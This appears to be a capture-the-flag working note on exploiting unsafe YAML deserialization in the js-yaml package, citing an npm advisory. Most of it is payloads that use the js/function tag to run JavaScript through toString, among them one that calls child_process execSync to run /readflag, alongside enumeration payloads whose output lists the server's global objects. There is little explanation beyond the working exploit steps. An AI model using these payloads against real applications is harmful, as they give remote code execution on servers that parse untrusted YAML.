https://www.npmjs.com/advisories/813

Sample yaml file
```
# An employee record
martin:
    name: Martin D'vloper
    job: Developer
    skill: Elite
```

Sample payload
`{ toString: !<tag:yaml.org,2002:js/function> 'function (){return Date.now()}' } : 1`

{ toString: !<tag:yaml.org,2002:js/function> 'function (){const { exec } = require("child_process");return execSync("/readflag")}' } : 1


Cannot alert -> likely not clientside?

```
{ toString: !<tag:yaml.org,2002:js/function> 'function (){return JSON.stringify(Object.keys(global));}' } : 1
```
```
{
  "[\"global\",\"clearInterval\",\"clearTimeout\",\"setInterval\",\"setTimeout\",\"queueMicrotask\",\"clearImmediate\",\"setImmediate\"]": 1
}
```

Notes:
1. you likely are only able to return a string


```
{ toString: !<tag:yaml.org,2002:js/function> 'function (){return JSON.stringify( Object.getOwnPropertyNames(global) );}' } : 1
```
```
{
  "[\"Object\",\"Function\",\"Array\",\"Number\",\"parseFloat\",\"parseInt\",\"Infinity\",\"NaN\",\"undefined\",\"Boolean\",\"String\",\"Symbol\",\"Date\",\"Promise\",\"RegExp\",\"Error\",\"EvalError\",\"RangeError\",\"ReferenceError\",\"SyntaxError\",\"TypeError\",\"URIError\",\"globalThis\",\"JSON\",\"Math\",\"console\",\"Intl\",\"ArrayBuffer\",\"Uint8Array\",\"Int8Array\",\"Uint16Array\",\"Int16Array\",\"Uint32Array\",\"Int32Array\",\"Float32Array\",\"Float64Array\",\"Uint8ClampedArray\",\"BigUint64Array\",\"BigInt64Array\",\"DataView\",\"Map\",\"BigInt\",\"Set\",\"WeakMap\",\"WeakSet\",\"Proxy\",\"Reflect\",\"decodeURI\",\"decodeURIComponent\",\"encodeURI\",\"encodeURIComponent\",\"escape\",\"unescape\",\"eval\",\"isFinite\",\"isNaN\",\"SharedArrayBuffer\",\"Atomics\",\"WebAssembly\",\"global\",\"process\",\"GLOBAL\",\"root\",\"Buffer\",\"URL\",\"URLSearchParams\",\"TextEncoder\",\"TextDecoder\",\"clearInterval\",\"clearTimeout\",\"setInterval\",\"setTimeout\",\"queueMicrotask\",\"clearImmediate\",\"setImmediate\"]": 1
}
```